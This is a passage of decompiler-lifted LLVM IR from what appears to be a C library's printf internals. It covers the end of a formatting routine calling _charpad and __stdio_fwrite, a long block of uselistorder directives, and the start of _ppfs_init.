  %v16_8060225 = icmp slt i32 %v5_8060225, 0
  store i1 %v16_8060225, i1* %sf.global-to-local, align 1
  %v1_8060229 = icmp eq i1 %v15_8060225, false
  br i1 %v1_8060229, label %dec_label_pc_8060322, label %dec_label_pc_806022f

dec_label_pc_806022f:                             ; preds = %dec_label_pc_8060210
  store i32 0, i32* %v3_8060225, align 4
  %v1_8060237.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8060237

dec_label_pc_8060237:                             ; preds = %dec_label_pc_8060209, %dec_label_pc_806022f
  %v1_8060237 = phi i32 [ %v0_8060209, %dec_label_pc_8060209 ], [ %v1_8060237.pre, %dec_label_pc_806022f ]
  %v0_8060237 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060237 = add i32 %v1_8060237, -4
  %v3_8060237 = inttoptr i32 %v2_8060237 to i32*
  store i32 %v0_8060237, i32* %v3_8060237, align 4
  %v0_8060238 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060238 = add i32 %v1_8060237, -8
  %v3_8060238 = inttoptr i32 %v2_8060238 to i32*
  store i32 %v0_8060238, i32* %v3_8060238, align 4
  %v1_8060239 = add i32 %v1_8060237, 384
  %v2_8060239 = inttoptr i32 %v1_8060239 to i32*
  %v3_8060239 = load i32, i32* %v2_8060239, align 4
  %v5_8060239 = add i32 %v1_8060237, -12
  %v6_8060239 = inttoptr i32 %v5_8060239 to i32*
  store i32 %v3_8060239, i32* %v6_8060239, align 4
  %v0_8060240 = load i32, i32* @edi, align 4
  %v1_8060240 = add i32 %v0_8060240, ptrtoint (i32* @global_var_806eedc.1577 to i32)
  store i32 %v1_8060240, i32* %eax.global-to-local, align 4
  %v2_8060246 = add i32 %v1_8060237, -16
  %v3_8060246 = inttoptr i32 %v2_8060246 to i32*
  store i32 %v1_8060240, i32* %v3_8060246, align 4
  %v0_8060247 = call i32 @__GI_fputs_unlocked()
  store i32 %v0_8060247, i32* %eax.global-to-local, align 4
  %v0_806024c = load i32, i32* @esp, align 4
  %v1_806024c = add i32 %v0_806024c, 400
  %v2_806024c = inttoptr i32 %v1_806024c to i32*
  %v3_806024c = load i32, i32* %v2_806024c, align 4
  store i32 %v3_806024c, i32* @eax, align 4
  %v0_8060253 = load i32, i32* @ebp, align 4
  store i32 %v0_8060253, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_806025a = call i32 @_charpad()
  store i32 %v0_806025a, i32* %eax.global-to-local, align 4
  %v0_806025f = load i32, i32* @esp, align 4
  %v1_806025f = add i32 %v0_806025f, 16
  %v1_8060262 = load i32, i32* @ebp, align 4
  %v2_8060262 = sub i32 %v0_806025a, %v1_8060262
  %v12_8060262 = icmp eq i32 %v2_8060262, 0
  %v13_8060262 = icmp slt i32 %v2_8060262, 0
  store i1 %v13_8060262, i1* %sf.global-to-local, align 1
  %v1_8060264 = icmp eq i1 %v12_8060262, false
  br i1 %v1_8060264, label %dec_label_pc_8060322, label %dec_label_pc_806026a

dec_label_pc_806026a:                             ; preds = %dec_label_pc_8060237
  %v1_806026a = add i32 %v0_806025f, 376
  %v2_806026a = inttoptr i32 %v1_806026a to i32*
  %v3_806026a = load i32, i32* %v2_806026a, align 4
  %v4_806026a = icmp eq i32 %v3_806026a, 0
  %v5_806026a = icmp slt i32 %v3_806026a, 0
  store i1 %v5_806026a, i1* %sf.global-to-local, align 1
  %v1_8060272 = icmp eq i1 %v4_806026a, false
  br i1 %v1_8060272, label %dec_label_pc_8060294, label %dec_label_pc_8060274

dec_label_pc_8060274:                             ; preds = %dec_label_pc_806026a
  %v0_8060274 = load i32, i32* @esi, align 4
  %v1_8060274 = icmp eq i32 %v0_8060274, 0
  %v2_8060274 = icmp slt i32 %v0_8060274, 0
  store i1 %v2_8060274, i1* %sf.global-to-local, align 1
  br i1 %v1_8060274, label %dec_label_pc_80602f4, label %dec_label_pc_8060278

dec_label_pc_8060278:                             ; preds = %dec_label_pc_8060274
  %v0_8060278 = load i32, i32* @edi, align 4
  %v2_8060278 = add i32 %v0_806025f, 12
  %v3_8060278 = inttoptr i32 %v2_8060278 to i32*
  store i32 %v0_8060278, i32* %v3_8060278, align 4
  %v1_8060279 = add i32 %v0_806025f, 400
  %v2_8060279 = inttoptr i32 %v1_8060279 to i32*
  %v3_8060279 = load i32, i32* %v2_8060279, align 4
  %v5_8060279 = add i32 %v0_806025f, 8
  %v6_8060279 = inttoptr i32 %v5_8060279 to i32*
  store i32 %v3_8060279, i32* %v6_8060279, align 4
  %v0_8060280 = load i32, i32* @esi, align 4
  %v2_8060280 = add i32 %v0_806025f, 4
  %v3_8060280 = inttoptr i32 %v2_8060280 to i32*
  store i32 %v0_8060280, i32* %v3_8060280, align 4
  %v0_8060281 = load i32, i32* @ebx, align 4
  %v3_8060281 = inttoptr i32 %v0_806025f to i32*
  store i32 %v0_8060281, i32* %v3_8060281, align 4
  %v0_8060282 = load i32, i32* %stack_var_-380, align 4
  %v4_8060282 = call i32 @__stdio_fwrite(i32 %v0_8060282, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8060282, i32* %eax.global-to-local, align 4
  %v0_8060287 = load i32, i32* @esp, align 4
  %v1_8060287 = add i32 %v0_8060287, 16
  %v1_806028a = load i32, i32* @esi, align 4
  %v2_806028a = sub i32 %v4_8060282, %v1_806028a
  %v12_806028a = icmp eq i32 %v2_806028a, 0
  %v13_806028a = icmp slt i32 %v2_806028a, 0
  store i1 %v13_806028a, i1* %sf.global-to-local, align 1
  %v1_806028c = icmp eq i1 %v12_806028a, false
  br i1 %v1_806028c, label %dec_label_pc_8060322, label %dec_label_pc_80602f4

dec_label_pc_8060294:                             ; preds = %dec_label_pc_806026a
  store i32 %v1_806026a, i32* @ebp, align 4
  %v1_806029b = add i32 %v0_806025f, 368
  %v2_806029b = inttoptr i32 %v1_806029b to i32*
  store i32 0, i32* %v2_806029b, align 4
  %v0_80602f014 = load i32, i32* @esi, align 4
  %v1_80602f015 = icmp eq i32 %v0_80602f014, 0
  %v2_80602f016 = icmp slt i32 %v0_80602f014, 0
  store i1 %v2_80602f016, i1* %sf.global-to-local, align 1
  %v1_80602f222 = icmp eq i1 %v1_80602f015, false
  %v0_80602a8.pre = load i32, i32* @esp, align 4
  br i1 %v1_80602f222, label %dec_label_pc_80602a8, label %dec_label_pc_80602f4

dec_label_pc_80602a8:                             ; preds = %dec_label_pc_8060294, %dec_label_pc_80602ee
  %v0_80602af = phi i32 [ %v2_80602ee, %dec_label_pc_80602ee ], [ %v0_80602f014, %dec_label_pc_8060294 ]
  %v1_80602ba = phi i32 [ %v0_80602a841, %dec_label_pc_80602ee ], [ %v0_80602a8.pre, %dec_label_pc_8060294 ]
  %v1_80602a8 = add i32 %v1_80602ba, 352
  %v1_80602af = add i32 %v0_80602af, -128
  %v2_80602af = icmp ult i32 %v0_80602af, 128
  %v6_80602af = icmp eq i32 %v1_80602af, 0
  %v7_80602af = icmp slt i32 %v1_80602af, 0
  store i1 %v7_80602af, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_80602ba = add i32 %v1_80602ba, -4
  %v3_80602ba = inttoptr i32 %v2_80602ba to i32*
  store i32 %v1_80602a8, i32* %v3_80602ba, align 4
  %v2_80602bb = or i1 %v2_80602af, %v6_80602af
  %v3_80602bb = load i32, i32* %eax.global-to-local, align 4
  %v4_80602bb = load i32, i32* @esi, align 4
  %v5_80602bb = select i1 %v2_80602bb, i32 %v4_80602bb, i32 %v3_80602bb
  store i32 %v5_80602bb, i32* %eax.global-to-local, align 4
  %v2_80602be = add i32 %v1_80602ba, -8
  %v3_80602be = inttoptr i32 %v2_80602be to i32*
  store i32 %v5_80602bb, i32* %v3_80602be, align 4
  %v0_80602bf = load i32, i32* @ebp, align 4
  %v2_80602bf = add i32 %v1_80602ba, -12
  %v3_80602bf = inttoptr i32 %v2_80602bf to i32*
  store i32 %v0_80602bf, i32* %v3_80602bf, align 4
  %v1_80602c0 = add i32 %v1_80602ba, 204
  store i32 %v1_80602c0, i32* @edi, align 4
  %v2_80602c7 = add i32 %v1_80602ba, -16
  %v3_80602c7 = inttoptr i32 %v2_80602c7 to i32*
  store i32 %v1_80602c0, i32* %v3_80602c7, align 4
  %v0_80602c8 = call i32 @__GI_wcsrtombs()
  %v0_80602cd = load i32, i32* @esp, align 4
  %v1_80602cd = add i32 %v0_80602cd, 16
  store i32 %v0_80602c8, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80602d4 = icmp eq i32 %v0_80602c8, 0
  %v2_80602d4 = icmp slt i32 %v0_80602c8, 0
  store i1 %v2_80602d4, i1* %sf.global-to-local, align 1
  br i1 %v1_80602d4, label %dec_label_pc_80602ee, label %dec_label_pc_80602d8

dec_label_pc_80602d8:                             ; preds = %dec_label_pc_80602a8
  %v0_80602d8 = load i32, i32* @ecx, align 4
  %v2_80602d8 = add i32 %v0_80602cd, 12
  %v3_80602d8 = inttoptr i32 %v2_80602d8 to i32*
  store i32 %v0_80602d8, i32* %v3_80602d8, align 4
  %v1_80602d9 = add i32 %v0_80602cd, 400
  %v2_80602d9 = inttoptr i32 %v1_80602d9 to i32*
  %v3_80602d9 = load i32, i32* %v2_80602d9, align 4
  %v5_80602d9 = add i32 %v0_80602cd, 8
  %v6_80602d9 = inttoptr i32 %v5_80602d9 to i32*
  store i32 %v3_80602d9, i32* %v6_80602d9, align 4
  %v2_80602e0 = add i32 %v0_80602cd, 4
  %v3_80602e0 = inttoptr i32 %v2_80602e0 to i32*
  store i32 %v0_80602c8, i32* %v3_80602e0, align 4
  %v0_80602e1 = load i32, i32* @edi, align 4
  %v3_80602e1 = inttoptr i32 %v0_80602cd to i32*
  store i32 %v0_80602e1, i32* %v3_80602e1, align 4
  %v0_80602e2 = load i32, i32* %stack_var_-380, align 4
  %v4_80602e2 = call i32 @__stdio_fwrite(i32 %v0_80602e2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80602e2, i32* %eax.global-to-local, align 4
  %v0_80602e7 = load i32, i32* @esp, align 4
  %v1_80602e7 = add i32 %v0_80602e7, 16
  %v2_80602ea = sub i32 %v4_80602e2, %v0_80602c8
  %v12_80602ea = icmp eq i32 %v2_80602ea, 0
  %v13_80602ea = icmp slt i32 %v2_80602ea, 0
  store i1 %v13_80602ea, i1* %sf.global-to-local, align 1
  %v1_80602ec = icmp eq i1 %v12_80602ea, false
  br i1 %v1_80602ec, label %dec_label_pc_8060322, label %dec_label_pc_80602ee

dec_label_pc_80602ee:                             ; preds = %dec_label_pc_80602d8, %dec_label_pc_80602a8
  %v1_80602ee = phi i32 [ %v4_80602e2, %dec_label_pc_80602d8 ], [ 0, %dec_label_pc_80602a8 ]
  %v0_80602a841 = phi i32 [ %v1_80602e7, %dec_label_pc_80602d8 ], [ %v1_80602cd, %dec_label_pc_80602a8 ]
  %v0_80602ee = load i32, i32* @esi, align 4
  %v2_80602ee = sub i32 %v0_80602ee, %v1_80602ee
  %v12_80602ee = icmp eq i32 %v2_80602ee, 0
  %v13_80602ee = icmp slt i32 %v2_80602ee, 0
  store i32 %v2_80602ee, i32* @esi, align 4
  store i1 %v13_80602ee, i1* %sf.global-to-local, align 1
  %v1_80602f2 = icmp eq i1 %v12_80602ee, false
  br i1 %v1_80602f2, label %dec_label_pc_80602a8, label %dec_label_pc_80602f4

dec_label_pc_80602f4:                             ; preds = %dec_label_pc_80602ee, %dec_label_pc_8060294, %dec_label_pc_8060278, %dec_label_pc_8060274
  %v0_80602f4 = phi i32 [ %v1_8060287, %dec_label_pc_8060278 ], [ %v1_806025f, %dec_label_pc_8060274 ], [ %v0_80602a8.pre, %dec_label_pc_8060294 ], [ %v0_80602a841, %dec_label_pc_80602ee ]
  %v1_80602f4 = add i32 %v0_80602f4, 8
  %v2_80602f4 = inttoptr i32 %v1_80602f4 to i32*
  %v3_80602f4 = load i32, i32* %v2_80602f4, align 4
  store i32 %v3_80602f4, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_80602fd = add i32 %v0_80602f4, 384
  %v2_80602fd = inttoptr i32 %v1_80602fd to i32*
  %v3_80602fd = load i32, i32* %v2_80602fd, align 4
  store i32 %v3_80602fd, i32* @eax, align 4
  %v0_8060304 = call i32 @_charpad()
  store i32 %v0_8060304, i32* %eax.global-to-local, align 4
  %v1_8060309 = load i32, i32* @esp, align 4
  %v2_8060309 = add i32 %v1_8060309, 8
  %v3_8060309 = inttoptr i32 %v2_8060309 to i32*
  %v4_8060309 = load i32, i32* %v3_8060309, align 4
  %v5_8060309 = sub i32 %v0_8060304, %v4_8060309
  %v15_8060309 = icmp eq i32 %v5_8060309, 0
  %v16_8060309 = icmp slt i32 %v5_8060309, 0
  store i1 %v16_8060309, i1* %sf.global-to-local, align 1
  %v1_806030d = icmp eq i1 %v15_8060309, false
  br i1 %v1_806030d, label %dec_label_pc_8060322, label %dec_label_pc_806030f

dec_label_pc_806030f:                             ; preds = %dec_label_pc_80602f4, %dec_label_pc_8060198, %dec_label_pc_805fe3f
  %v0_806030f = phi i32 [ %v1_8060309, %dec_label_pc_80602f4 ], [ %v0_806030f.pre, %dec_label_pc_8060198 ], [ %v1_805fe5d, %dec_label_pc_805fe3f ]
  %v1_806030f = add i32 %v0_806030f, 16
  %v2_806030f = inttoptr i32 %v1_806030f to i32*
  %v3_806030f = load i32, i32* %v2_806030f, align 4
  store i32 %v3_806030f, i32* @ebx, align 4
  store i32 %v3_806030f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805fd96.backedge

dec_label_pc_806031a:                             ; preds = %dec_label_pc_805fdd4
  %v1_806031a = add i32 %v0_806031a, 2
  %v10_806031a = icmp slt i32 %v1_806031a, 0
  store i1 %v10_806031a, i1* %sf.global-to-local, align 1
  store i32 %v1_806031a, i32* @ebx, align 4
  br label %dec_label_pc_805fd96.backedge

dec_label_pc_8060322:                             ; preds = %dec_label_pc_805fdc0, %dec_label_pc_806003d, %dec_label_pc_80602f4, %dec_label_pc_8060278, %dec_label_pc_8060237, %dec_label_pc_8060210, %dec_label_pc_8060190, %dec_label_pc_8060073, %dec_label_pc_80602d8
  %v0_8060322 = phi i32 [ %v1_80602e7, %dec_label_pc_80602d8 ], [ %v0_8060322.pre.pre, %dec_label_pc_805fdc0 ], [ %v1_8060060, %dec_label_pc_806003d ], [ %v1_8060309, %dec_label_pc_80602f4 ], [ %v1_8060287, %dec_label_pc_8060278 ], [ %v1_806025f, %dec_label_pc_8060237 ], [ %v1_8060225, %dec_label_pc_8060210 ], [ %v20_8060198, %dec_label_pc_8060190 ], [ %v1_806008b, %dec_label_pc_8060073 ]
  %v1_8060322 = inttoptr i32 %v0_8060322 to i32*
  store i32 -1, i32* %v1_8060322, align 4
  br label %dec_label_pc_8060329

dec_label_pc_8060329:                             ; preds = %dec_label_pc_805fdcb, %dec_label_pc_805fd39, %dec_label_pc_805fd58, %dec_label_pc_8060322
  %v0_8060329 = load i32, i32* @esp, align 4
  %v1_8060329 = inttoptr i32 %v0_8060329 to i32*
  %v2_8060329 = load i32, i32* %v1_8060329, align 4
  store i32 %v2_8060329, i32* %eax.global-to-local, align 4
  %v1_806032c = add i32 %v0_8060329, 364
  %v10_806032c = icmp slt i32 %v1_806032c, 0
  store i1 %v10_806032c, i1* %sf.global-to-local, align 1
  %v1_8060332 = inttoptr i32 %v1_806032c to i32*
  %v2_8060332 = load i32, i32* %v1_8060332, align 4
  store i32 %v2_8060332, i32* @ebx, align 4
  %v3_8060332 = add i32 %v0_8060329, 368
  %v1_8060333 = inttoptr i32 %v3_8060332 to i32*
  %v2_8060333 = load i32, i32* %v1_8060333, align 4
  store i32 %v2_8060333, i32* @esi, align 4
  %v3_8060333 = add i32 %v0_8060329, 372
  %v1_8060334 = inttoptr i32 %v3_8060333 to i32*
  %v2_8060334 = load i32, i32* %v1_8060334, align 4
  store i32 %v2_8060334, i32* @edi, align 4
  %v3_8060334 = add i32 %v0_8060329, 376
  %v1_8060335 = inttoptr i32 %v3_8060334 to i32*
  %v2_8060335 = load i32, i32* %v1_8060335, align 4
  store i32 %v2_8060335, i32* @ebp, align 4
  ret i32 %v2_8060329

; uselistorder directives
  uselistorder i32 %v1_806031a, { 1, 2, 0 }
  uselistorder i32 %v3_806030f, { 2, 3, 0, 1 }
  uselistorder i32 %v0_80602f4, { 1, 0 }
  uselistorder i32 %v2_80602ee, { 1, 2, 3, 0 }
  uselistorder i32 %v0_80602cd, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_80602c8, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_80602af, { 1, 0 }
  uselistorder i32 %v0_80602a8.pre, { 1, 0 }
  uselistorder i32 %v0_8060274, { 1, 0 }
  uselistorder i32 %v3_806026a, { 1, 0 }
  uselistorder i32 %v0_806025f, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_8060237, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8060209, { 0, 2, 1, 3 }
  uselistorder i8 %v4_80601f3, { 1, 0 }
  uselistorder i32 %v0_80601da, { 1, 0 }
  uselistorder i32 %v1_80601c4, { 1, 0 }
  uselistorder i32 %v1_80601b9, { 1, 0 }
  uselistorder i32 %v0_80601b9, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8060151, { 1, 0 }
  uselistorder i32 %v1_8060131, { 1, 0 }
  uselistorder i32 %v3_80600bb, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v1_80600c7, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_8060103, { 3, 2, 1, 0 }
  uselistorder i32 %v1_80600a3, { 1, 0 }
  uselistorder i32 %v1_806008e, { 1, 0 }
  uselistorder i32 %v1_8060063, { 1, 0 }
  uselistorder i32 %v0_80600de.pre, { 0, 3, 4, 5, 6, 7, 2, 1 }
  uselistorder i32 %v0_8060023, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v4_8060013, { 1, 0 }
  uselistorder i32 %v1_806000a, { 1, 0 }
  uselistorder i32 %v1_805ffcb, { 1, 0 }
  uselistorder i32 %v4_805ff9c, { 1, 0 }
  uselistorder i32 %v0_805ff91, { 1, 0, 2, 3 }
  uselistorder i8 %v3_805ff8c, { 1, 0 }
  uselistorder i32 %v0_805ffc2, { 1, 0, 2, 3 }
  uselistorder i8 %v3_805ff81, { 1, 0 }
  uselistorder i32 %v1_805ff78, { 1, 0 }
  uselistorder i32 %v1_805ff6c, { 1, 0 }
  uselistorder i32 %v3_805ff5d, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805ff53, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v2_805ff4f, { 4, 5, 3, 1, 2, 0 }
  uselistorder i32 %v0_805ff9c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_805ff8c, { 1, 2, 0 }
  uselistorder i32 %v3_805ff29, { 0, 1, 3, 2 }
  uselistorder i8 %v3_805ff17, { 1, 0 }
  uselistorder i32 %v4_805ff0e, { 1, 0 }
  uselistorder i32 %v3_805ff0e, { 1, 0 }
  uselistorder i32 %v0_805fed7, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_805fed6, { 1, 0 }
  uselistorder i32 %v1_805feaf, { 1, 0 }
  uselistorder i32 %v1_805fea3, { 1, 0 }
  uselistorder i32 %v1_805fe9e, { 1, 0 }
  uselistorder i32 %v2_805fe96, { 1, 0 }
  uselistorder i32 %tmp67, { 1, 0 }
  uselistorder i32 %v3_805fe80, { 1, 0, 2 }
  uselistorder i8 %v2_805fe79, { 1, 0 }
  uselistorder i32 %v4_805fe6e, { 2, 1, 0 }
  uselistorder i32 %v1_805fe65, { 1, 0 }
  uselistorder i32 %v3_805fe37, { 15, 4, 5, 3, 1, 2, 14, 13, 11, 0, 10, 8, 9, 12, 6, 7, 16, 17, 18 }
  uselistorder i32 %v0_805fec7.lcssa, { 36, 35, 34, 33, 32, 31, 30, 10, 5, 6, 7, 8, 9, 13, 14, 39, 12, 11, 15, 38, 37, 18, 19, 20, 21, 22, 23, 17, 16, 26, 25, 24, 29, 28, 27, 1, 2, 3, 4, 0 }
  uselistorder i32 %v5_805fe31, { 1, 0 }
  uselistorder i32 %v1_805fe31.pre, { 0, 2, 1 }
  uselistorder i32 %v1_805fe30, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v1_805fe2d, { 1, 0 }
  uselistorder i32 %v5_805fe3173, { 1, 0 }
  uselistorder i32 %v3_805fe1b, { 1, 0 }
  uselistorder i8 %v4_805fdd4, { 1, 0 }
  uselistorder i32 %v1_805fdd4, { 1, 0, 3, 2 }
  uselistorder i8 %v2_805fdcb, { 1, 0 }
  uselistorder i32 %v2_805fda0, { 3, 2, 1, 0, 4, 5 }
  uselistorder i8 %v2_805fd9c, { 1, 0 }
  uselistorder i8 %v2_805fd96, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805fda4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_805fd86, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-364, { 1, 0, 2 }
  uselistorder i32* %stack_var_-380, { 1, 2, 0, 5, 4, 3, 6, 7, 8, 9 }
  uselistorder i1* %sf.global-to-local, { 1, 2, 3, 7, 4, 5, 6, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 88, 86, 89, 90, 91, 92, 93, 94 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 20, 16, 17, 18, 21, 19, 22, 23, 24, 25, 26 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 37, 32, 33, 34, 35, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 72, 71, 0, 58, 59, 60, 61, 62, 63, 64, 66, 65, 67, 68, 69, 70 }
  uselistorder i32 368, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 204, { 0, 1, 3, 4, 2 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 352, { 1, 0, 2, 3 }
  uselistorder i32 332, { 0, 2, 3, 4, 5, 1, 6 }
  uselistorder label %dec_label_pc_8060329, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8060322, { 2, 8, 3, 4, 5, 6, 7, 1, 0 }
  uselistorder label %dec_label_pc_80602a8, { 1, 0 }
  uselistorder label %dec_label_pc_8060237, { 1, 0 }
  uselistorder label %dec_label_pc_8060209, { 1, 0 }
  uselistorder label %dec_label_pc_80601ce, { 1, 0 }
  uselistorder label %dec_label_pc_80601b9, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8060190, { 1, 0 }
  uselistorder label %dec_label_pc_8060127, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80600f5, { 1, 0 }
  uselistorder label %dec_label_pc_80600de, { 1, 0 }
  uselistorder label %dec_label_pc_80600d5, { 1, 0 }
  uselistorder label %dec_label_pc_80600bb, { 1, 0 }
  uselistorder label %dec_label_pc_805ffe4, { 1, 0 }
  uselistorder label %dec_label_pc_805ff8c, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805ff3f, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805feef, { 1, 0 }
  uselistorder label %dec_label_pc_805fed6, { 1, 0 }
  uselistorder label %dec_label_pc_805fec2, { 1, 0 }
  uselistorder label %dec_label_pc_805febd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805fe9e, { 1, 0 }
  uselistorder label %dec_label_pc_805fe26, { 1, 0 }
  uselistorder label %dec_label_pc_805fe22, { 1, 0 }
  uselistorder label %dec_label_pc_805fdcb, { 1, 0 }
  uselistorder label %dec_label_pc_805fdc0, { 1, 0 }
  uselistorder label %dec_label_pc_805fd96.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8060338 = load i32, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_806033b = load i32, i32* @esi, align 4
  %v0_8060341 = load i32, i32* @ebx, align 4
  store i32 %v0_8060341, i32* %stack_var_-12, align 4
  %v4_8060345 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8060345, i32* @esi, align 4
  store i32 %arg2, i32* @ebx, align 4
  store i32 %v4_8060345, i32* @edi, align 4
  %v5_806034f = call i8* @_memset(i8* %arg1, i32 0, i32 47)
  %v6_806034f = ptrtoint i8* %v5_806034f to i32
  store i32 %v6_806034f, i32* @ecx, align 4
  %v0_8060351 = load i32, i32* @esi, align 4
  %v1_8060351 = add i32 %v0_8060351, 24
  %v2_8060351 = inttoptr i32 %v1_8060351 to i32*
  %v3_8060351 = load i32, i32* %v2_8060351, align 4
  %v4_8060351 = add i32 %v3_8060351, -1
  store i32 %v4_8060351, i32* %v2_8060351, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v0_8060359 = load i32, i32* @esi, align 4
  %v1_8060359 = add i32 %v0_8060359, 40
  store i32 %v1_8060359, i32* %eax.global-to-local, align 4
  %v0_806035c = load i32, i32* @ebx, align 4
  %v2_806035c = inttoptr i32 %v0_8060359 to i32*
  store i32 %v0_806035c, i32* %v2_806035c, align 4
  %v0_806035e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806035e

dec_label_pc_806035e:                             ; preds = %dec_label_pc_806035e, %entry
  %v0_806035e = phi i32 [ %v1_8060364, %dec_label_pc_806035e ], [ %v0_806035e.pre, %entry ]
  %v1_806035e = inttoptr i32 %v0_806035e to i32*
  store i32 8, i32* %v1_806035e, align 4
  %v0_8060364 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060364 = add i32 %v0_8060364, 4
  store i32 %v1_8060364, i32* %eax.global-to-local, align 4
  %v0_8060367 = load i32, i32* %edx.global-to-local, align 4
  %v1_8060367 = add i32 %v0_8060367, -1
  %v8_8060367 = icmp eq i32 %v1_8060367, 0
  store i32 %v1_8060367, i32* %edx.global-to-local, align 4
  %v1_8060368 = icmp eq i1 %v8_8060367, false
  br i1 %v1_8060368, label %dec_label_pc_806035e, label %dec_label_pc_806036a

dec_label_pc_806036a:                             ; preds = %dec_label_pc_806035e
  %v0_806036a = load i32, i32* @ebx, align 4
  store i32 %v0_806036a, i32* %eax.global-to-local, align 4
  %v1_806039519 = inttoptr i32 %v0_806036a to i8*
  %v2_806039520 = load i8, i8* %v1_806039519, align 1
  %v3_806039521 = zext i8 %v2_806039520 to i32
  %v5_806039522 = and i32 %v1_8060367, -256
  %v6_806039523 = or i32 %v3_806039521, %v5_806039522
  store i32 %v6_806039523, i32* @edx, align 4
  %v4_806039724 = icmp eq i8 %v2_806039520, 0
  %v1_806039926 = icmp eq i1 %v4_806039724, false
  br i1 %v1_806039926, label %dec_label_pc_806036e, label %dec_label_pc_806039b

dec_label_pc_806036e:                             ; preds = %dec_label_pc_806036a, %dec_label_pc_8060395.backedge
  %v6_806039529 = phi i32 [ %v6_8060395, %dec_label_pc_8060395.backedge ], [ %v6_806039523, %dec_label_pc_806036a ]
  %v2_806039528 = phi i8 [ %v2_8060395, %dec_label_pc_8060395.backedge ], [ %v2_806039520, %dec_label_pc_806036a ]
  %v0_806037327 = phi i32 [ %storemerge4, %dec_label_pc_8060395.backedge ], [ %v0_806036a, %dec_label_pc_806036a ]
  %v10_806036e = icmp eq i8 %v2_806039528, 37
  %v1_8060371 = icmp eq i1 %v10_806036e, false
  br i1 %v1_8060371, label %dec_label_pc_8060394, label %dec_label_pc_8060373

dec_label_pc_8060373:                             ; preds = %dec_label_pc_806036e
  %v1_8060373 = add i32 %v0_806037327, 1
  store i32 %v1_8060373, i32* %eax.global-to-local, align 4
  %v1_8060374 = inttoptr i32 %v1_8060373 to i8*
  %v2_8060374 = load i8, i8* %v1_8060374, align 1
  %v11_8060374 = icmp eq i8 %v2_8060374, 37
  br i1 %v11_8060374, label %dec_label_pc_8060394, label %dec_label_pc_8060379

dec_label_pc_8060379:                             ; preds = %dec_label_pc_8060373
  %v1_806037c = load i32, i32* @esi, align 4
  %v2_806037c = inttoptr i32 %v1_806037c to i32*
  store i32 %v1_8060373, i32* %v2_806037c, align 4
  %v0_806037e = load i32, i32* @esi, align 4
  %v2_806037f = call i32 @_ppfs_parsespec(i32 %v0_806037e)
  store i32 %v2_806037f, i32* %eax.global-to-local, align 4
  %v2_8060387 = icmp slt i32 %v2_806037f, 0
  %v1_8060389 = icmp eq i1 %v2_8060387, false
  br i1 %v1_8060389, label %dec_label_pc_8060390, label %dec_label_pc_806039f

dec_label_pc_8060390:                             ; preds = %dec_label_pc_8060379
  %v0_8060390 = load i32, i32* @esi, align 4
  %v1_8060390 = inttoptr i32 %v0_8060390 to i32*
